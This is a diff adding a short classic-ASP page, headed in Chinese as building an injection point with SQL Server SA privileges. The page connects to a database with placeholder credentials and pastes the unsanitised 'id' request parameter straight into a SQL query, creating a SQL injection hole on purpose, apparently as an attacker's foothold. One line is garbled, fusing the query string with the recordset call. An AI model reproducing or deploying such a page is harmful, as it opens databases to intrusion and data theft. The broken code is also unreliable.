@@ -1,0 +1,19 @@
+
+1433 SA权限构建注入点：
+
+<%
+strSQLServerName = "服务器ip"
+strSQLDBUserName = "数据库帐号"
+strSQLDBPassword = "数据库密码"
+strSQLDBName = "数据库名称"
+Set conn = server.CreateObject("ADODB.Connection")
+strCon = "Provider=SQLOLEDB.1;Persist Security Info=False;Server=" & strSQLServerName & ";User ID=" & strSQLDBUserName & ";Password=" & strSQLDBPassword & ";Database=" & strSQLDBName & ";"
+conn.open strCon
+Dim rs, strSQL, id
+Set rs = server.CreateObject("ADODB.recordset")
+id = request("id")
+strSQL = "select * from ACTLIST where worldid=" & idrs.open strSQL,conn,1,3
+rs.Close
+%>
+
+
